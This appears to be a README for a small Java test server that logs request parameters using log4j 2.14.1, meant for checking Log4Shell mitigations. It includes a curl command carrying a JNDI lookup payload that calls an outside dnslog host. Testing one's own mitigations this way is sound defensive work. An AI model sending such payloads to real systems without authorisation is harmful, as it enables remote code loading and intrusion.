# log4Jtest
## Description
Simple Java http server running on port 8000 that logs all request params so you can attempt to validate various mitigations you may have in place

## Running
### Java Side
To test you can just execute from the bin directory and specify the version of log4J you want, can grab log4j versions from https://archive.apache.org/dist/logging/log4j/
```
java -cp "scratchpad/log4jtest/webserver/bin:scratchpad/log4jtest/apache-log4j-2.14.1-bin/log4j-core-2.14.1.jar:scratchpad/log4jtest/apache-log4j-2.14.1-bin/log4j-api-2.14.1.jar" --enable-preview App
```
### Client Side
Can just use CURL to URL encode a test:
```
curl -G --data-urlencode "test=\${jndi:ldap://4jediz.dnslog.cn/testing}" http://localhost:8000/
```

## Example
